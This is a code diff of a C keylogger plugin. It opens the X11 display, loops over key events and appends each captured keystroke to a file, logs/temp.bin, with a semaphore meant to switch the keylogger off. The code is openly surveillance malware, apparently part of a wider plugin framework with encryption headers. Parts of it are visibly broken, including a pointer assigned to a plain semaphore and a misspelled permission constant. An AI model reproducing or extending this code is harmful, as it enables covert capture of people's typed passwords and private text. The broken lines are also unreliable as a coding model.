@@ -3,6 +3,9 @@
 #include <string.h>
 #include <unistd.h>
 #include <X11/Xlib.h>
+#include <semaphore.h>
+#include <sys/types.h>
+#include <sys/wait.h>
 
 #include "../include/encrypt.h"
 #include "../include/hydrogen.h"
@@ -11,11 +14,16 @@
 
 #define SEM "/keylog"
 
+/**
+ * Auxiliar functions
+ */
+
 int init_plugin()
 {
 	int flag = 0;
 	char buffer;
-	char* bin_buf;
+	FILE* f;
+	sem_t close_sem;
 
 	Display* dply;
 	XEvent event;
@@ -26,8 +34,11 @@ int init_plugin()
 	 * Open the semaphore, for being able to turn off the keylogger
 	 */
 
-	// TODO
-
+	if((close_sem = sem_open(SEM, O_CREAT, S_IRUSR | S_SIWUSR, 1)) == SEM_FAILED)
+	{
+		DEBUG_PRINT((P_ERROR"Failed to create semaphore"));
+		return ERROR;
+	}
 	/**
 	 * Open the display
 	 */
@@ -35,6 +46,18 @@ int init_plugin()
 	// TODO: Check if we are getting the correct display, suposedly getting DISPLAY enviroment variable
 
 	dply = XOpenDisplay(0);
+
+	/**
+	 * Open the file
+	 */
+
+	f = fopen("logs/temp.bin", "ab");
+
+	if(f == NULL)
+	{
+		DEBUG_PRINT((P_ERROR"Failed to open temp.bin in logs/"));
+		return ERROR;
+	}
 
 	while(flag == 0){
 		/**
@@ -51,9 +74,9 @@ int init_plugin()
 
 			//TODO : Do something about the mod keys
 
-			itoa(buffer, bin_buf, 2);
+			//TODO: print buffer somewhere
 
-			//TODO: print bin_buf somewhere
+			fprintf(f,"%c", buffer);
 		}
 
 	}
